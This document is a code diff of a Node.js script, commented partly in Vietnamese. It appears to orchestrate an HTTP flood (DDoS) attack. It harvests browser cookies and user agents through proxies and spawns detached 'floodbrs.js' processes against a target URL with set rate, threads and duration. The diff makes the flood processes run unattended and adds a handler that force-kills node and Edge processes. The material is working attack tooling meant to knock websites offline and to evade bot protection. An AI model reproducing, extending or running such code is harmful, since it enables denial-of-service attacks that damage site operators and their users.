@@ -43,30 +43,45 @@ const validKey = generateRandomString(5, 10);
 
 const readProxies = (filePath) => {
     try {
-        const data = fs.readFileSync(filePath, 'utf8');
-        const proxies = data.trim().split(/\r?\n/);
-        return proxies;
+        return fs.readFileSync(filePath, 'utf8').trim().split(/\r?\n/).filter(Boolean);
     } catch (error) {
-        console.error('Error reading proxies file:', error);
+        console.error('Error reading proxies file:', error.message);
         return [];
     }
 };
 
-function maskProxy(proxy) {
+const maskProxy = (proxy) => {
     const parts = proxy.split(':');
-    if (parts.length >= 2) {
+    if (parts.length >= 2 && parts[0].split('.').length === 4) {
         const ipParts = parts[0].split('.');
-        if (ipParts.length === 4) {
-            // Mask the last two octets of the IP
-            const maskedIP = `${ipParts[0]}.${ipParts[1]}.**.**`;
-            // Mask the port
-            const maskedPort = '****';
-            return `${maskedIP}:${maskedPort}`;
-        }
+        return `${ipParts[0]}.${ipParts[1]}.**.**:****`;
     }
     return proxy;
 };
+process.on('SIGINT', () => {
+    coloredLog(COLORS.YELLOW, '[INFO] Nhận tín hiệu Ctrl+C, đang kill processes...');
+    
+    exec('taskkill /f /im node.exe', (err) => {
+        if (err && err.code !== 128) {
+            coloredLog(COLORS.RED, `[INFO] Lỗi kill node.exe: ${err.message}`);
+        } else {
+            coloredLog(COLORS.GREEN, '[INFO] Đã kill node.exe processes');
+        }
+    });
 
+    exec('taskkill /f /im msedge.exe', (err) => {
+        if (err && err.code !== 128) {
+            coloredLog(COLORS.RED, `[INFO] Lỗi kill msedge.exe: ${err.message}`);
+        } else {
+            coloredLog(COLORS.GREEN, '[INFO] Đã kill msedge.exe processes');
+        }
+    });
+
+    setTimeout(() => {
+        coloredLog(COLORS.GREEN, '[INFO] Exiting...');
+        process.exit(0);
+    }, 3000);
+});
 const coloredLog = (color, text) => {
     console.log(`${color}${text}${COLORS.RESET}`);
 };
@@ -429,7 +444,7 @@ const launchBrowserWithRetry = async (targetURL, browserProxy, attempt = 1, maxR
     }
 };
 
-// Thread handling
+// Thread handling - ĐÃ SỬA: Spawn liên tục như browser1.js
 const startThread = async (targetURL, browserProxy, task, done, retries = 0) => {
     if (retries >= COOKIES_MAX_RETRIES) {
         done(null, { task, currentTask: queue.length() });
@@ -454,46 +469,30 @@ const startThread = async (targetURL, browserProxy, task, done, retries = 0) => 
             console.log(cookieInfo);
 
             try {
-                coloredLog(COLORS.YELLOW, `[DEBUG] Spawning floodbrs with args: ${[
-                    targetURL, duration.toString(), '3', response.browserProxy, rate, response.cookies, response.userAgent.toString(), validKey
-                ].join(', ')}`);
-
+                coloredLog(COLORS.YELLOW, `[DEBUG] Spawning floodbrs với proxy: ${maskProxy(browserProxy)}`);
+                
+                // SPAWN LIÊN TỤC NHƯ BROWSER1.JS
                 const floodProcess = spawn('node', [
                     'floodbrs.js',
                     targetURL,
                     duration.toString(),
-                    '3', // Sử dụng threads thay vì thread
-                    response.browserProxy,
                     rate,
+                    threads.toString(),
+                    proxyFile,
                     response.cookies,
-                    response.userAgent.toString(),
+                    response.userAgent,
                     validKey
-                ]);
-
-                floodProcess.stdout.on('data', (data) => {
-                    const output = data.toString().trim();
-                    if (output) {
-                        coloredLog(COLORS.GREEN, `[FLOOD] ${output}`);
-                    } else {
-                        coloredLog(COLORS.YELLOW, `[FLOOD] Empty output received from floodbrs`);
-                    }
+                ], {
+                    detached: true,
+                    stdio: 'ignore'
                 });
 
-                floodProcess.stderr.on('data', (data) => {
-                    coloredLog(COLORS.RED, `[FLOOD ERROR] ${data.toString()}`);
-                });
-
-                floodProcess.on('error', (error) => {
-                    coloredLog(COLORS.RED, `[FLOOD SPAWN ERROR] Failed to spawn floodbrs: ${error.message}`);
-                });
-
-                floodProcess.on('exit', (code) => {
-                    coloredLog(COLORS.GREEN, `[FLOOD] Process exited with code ${code}`);
-                });
-
-                coloredLog(COLORS.GREEN, `[INFO] Started floodbrs for proxy: ${maskProxy(browserProxy)}`);
+                floodProcess.unref();
+                
+                coloredLog(COLORS.GREEN, `[INFO] Đã spawn floodbrs process cho proxy: ${maskProxy(browserProxy)}`);
+                
             } catch (error) {
-                coloredLog(COLORS.RED, `[INFO] Error spawning floodbrs: ${error.message}`);
+                coloredLog(COLORS.RED, `[INFO] Lỗi spawn floodbrs: ${error.message}`);
             }
 
             done(null, { task });
@@ -531,11 +530,11 @@ const main = async () => {
         coloredLog(COLORS.YELLOW, '[INFO] Time\'s up! Cleaning up...');
         queue.kill();
 
-        exec('pkill -f flood.js', (err) => {
+        exec('pkill -f floodbrs.js', (err) => {
             if (err && err.code !== 1) {
-                console.error('Error killing flood.js processes:', err.message);
+                console.error('Error killing floodbrs.js processes:', err.message);
             } else {
-                coloredLog(COLORS.GREEN, '[INFO] Successfully killed flood.js processes');
+                coloredLog(COLORS.GREEN, '[INFO] Successfully killed floodbrs processes');
             }
         });
 
